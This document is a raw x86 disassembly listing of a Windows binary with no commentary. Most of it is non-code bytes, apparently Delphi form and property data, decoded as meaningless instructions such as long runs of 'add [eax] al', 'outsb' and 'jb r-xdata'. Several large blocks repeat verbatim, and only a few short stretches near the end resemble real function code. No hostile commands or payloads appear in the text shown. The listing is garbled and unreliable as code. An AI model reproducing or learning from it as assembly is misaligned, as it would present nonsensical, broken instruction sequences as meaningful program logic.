push eax
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
add [ eax + 0x5e ] dl
inc ebx
add [ esp + edx * 4 + 0x16640041 ] bh
inc edx
add al bl
xchg ebx eax
inc ecx
add [ edi + edx ] bh
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x1f4fffbb ] dl
inc ebp
add [ esi + 0x43 ] dl
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x7004362 ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
push ss
inc edx
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add ah ah
dec ebx
inc ebx
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ ebx + 0x43 ]
jae r-xdata
add [ esp + esi * 2 + 0x41 ] ch
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc esp
add [ eax ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
les ecx [ 0x1000045 ]
sub_434df4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x4f
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
dec edi
inc ebx
add [ eax ] ch
add al [ eax ]
add [ esp + ecx * 2 + 0x43 ] dh
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x20 ] ah
inc ebp
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah dl
pop edi
inc ebx
add [ eax - 0x37 ] ch
inc ebp
add [ eax ] ch
inc bx
add al dl
int 0x45
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
rcl [ ebp + eax * 2 + 0x45930000 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x1f4fffbb ] dl
inc ebp
add [ esi + 0x43 ] dl
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x6004362 ] al
push esp
push eax
popad
outsb
insb
nop
adc al 0x4f
inc ebx
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
cmp al 0x4e
inc ebx
add al cl
dec ebp
inc ebx
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
je r-xdata
add bh bh
inc eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
test al 0x5e
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
or [ ebx + eax * 2 ] ah
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add al bl
add [ ebp ] al
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
inc ebx
jb r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8465646f
push ss
add dh bh
jo r-xdata
inc ebp
add [ eax ] bl
add al [ eax ]
[ esp + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x16846564
insb
dec ecx
outsb
outsb
jb r-xdata
inc ebp
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi + ecx * 2 ] bh
push ss
inc ebp
add [ edx ] dl
add al [ eax ]
jmp [ esp ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3f00ffff ] ah
les eax [ ebp ]
in al 0xc4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
test al 0x7
inc ebp
add [ edx + ebx * 2 + 0x45 ] cl
add [ edx + ebx * 2 + 0x45 ] bh
add [ eax + 0x7a ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
jb r-xdata
or [ ebp ] al
je r-xdata
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb al 0x2
add bh bh
js r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x14ff0001 ] ah
mov [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
imul ebp [ edi + 0x6e ] sub_422998
jo r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ ecx ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ edx * 8 + 0xbc0045 ] bh
add dh bh
pop ds
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x40ff0000
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ esi ] bl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ 0x1dff0002 ] bl
add al [ eax ]
inc [ ecx ]
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
rol [ gs : eax ] 0x45
adc [ eax ] al
test al 0x1
add bh bh
and al 0xaf
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
cmp al 0xd5
inc ebp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
sbb al 0xc5
inc ebp
add [ ebp + eax * 8 + 0x10045 ] bl
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
call sub_4399ac
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x9c656c62
push cs
inc ebp
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jb r-xdata
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
jo r-xdata
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
adc [ ebp + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
xor [ eax ] 0x0
jpe r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
push [ ebp + eax * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
lds eax [ ebp ]
pushfd
lds eax [ ebp ]
add [ eax ] eax
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0xf0ff0001
les eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
[ ecx + ebx * 2 + 0x45 ]
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
sub [ eax ] 0x0
inc ebp
add [ ecx ] al
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090028 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
pop edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
call 0xffffffffe9425512
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
pop esp
or eax [ ebp ]
push eax
outsd
jo r-xdata
pop es
inc ebp
add [ eax * 8 - 0x3a63ffbb ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
dec edi
outsb
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc edi
je r-xdata
add [ eax + 0x4f070038 ] al
pop edi
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
jo r-xdata
or eax 0x1000045
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
inc esp
outsd
ja r-xdata
add [ eax ] 0x0
pop edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x45
add [ eax ] cl
jo r-xdata
dec ebp
outsd
jne r-xdata
imul esi [ ebp + 0x49 ] 0x706f666e
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
imul esp [ ebx + 0x6b ] r-xdata
insb
inc ebx
insb
inc esp
jb r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
xor [ ebx ] 0x0
or cl [ edi + 0x6e ]
or al 0x45
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
clc
jb r-xdata
call 0xffffffffd8439b3a
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003d ] al
outsb
dec ebp
inc ebp
add al ah
add [ eax ] al
jmp eax
jo r-xdata
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424c94
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
push cs
inc ebp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
or eax 0x1f00045
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x55 ] bp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
push ebp
jo r-xdata
or al 0x45
add [ eax - 0x4700ffff ] bh
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
jb r-xdata
je r-xdata
outsd
jne r-xdata
add [ eax ] al
cmp [ 0x6e4f0900 ] 0x4d
pop edi
inc ecx
add al bh
add [ eax ] al
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4253e0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424c94
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4253e0
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
in al 0x8b
inc ebp
clc
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
pop eax
sub_434ec0
xor al 0xbd
inc ebp
add [ edx + eax * 8 + 0x45 ] dl
add [ esp - 0x75b7ffbd ] dl
inc ebp
add al ch
xchg edi eax
inc ebp
add [ eax - 0x2fffbca0 ] bl
xchg esp eax
inc ebp
add [ eax ] al
xchg ebx eax
inc ebp
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x1f4fffbb ] dl
inc ebp
add [ esi + 0x43 ] dl
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x6004362 ] al
push esp
push eax
popad
outsb
insb
nop
adc al 0x4f
inc ebx
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
cmp al 0x4e
inc ebx
add al cl
dec ebp
inc ebx
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
je r-xdata
add bh bh
inc eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
test al 0x5e
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
or [ ebx + eax * 2 ] ah
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add al bl
add [ ebp ] al
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
inc ebx
jb r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8465646f
push ss
add dh bh
jo r-xdata
inc ebp
add [ eax ] bl
add al [ eax ]
[ esp + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x16846564
insb
dec ecx
outsb
outsb
jb r-xdata
inc ebp
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi + ecx * 2 ] bh
push ss
inc ebp
add [ edx ] dl
add al [ eax ]
jmp [ esp ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3f00ffff ] ah
les eax [ ebp ]
in al 0xc4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
test al 0x7
inc ebp
add [ edx + ebx * 2 + 0x45 ] cl
add [ edx + ebx * 2 + 0x45 ] bh
add [ eax + 0x7a ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
jb r-xdata
or [ ebp ] al
je r-xdata
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb al 0x2
add bh bh
js r-xdata
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x14ff0001 ] ah
mov [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
imul ebp [ edi + 0x6e ] sub_422998
jo r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ ecx ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ edx * 8 + 0xbc0045 ] bh
add dh bh
pop ds
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x40ff0000
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ esi ] bl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ 0x1dff0002 ] bl
add al [ eax ]
inc [ ecx ]
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
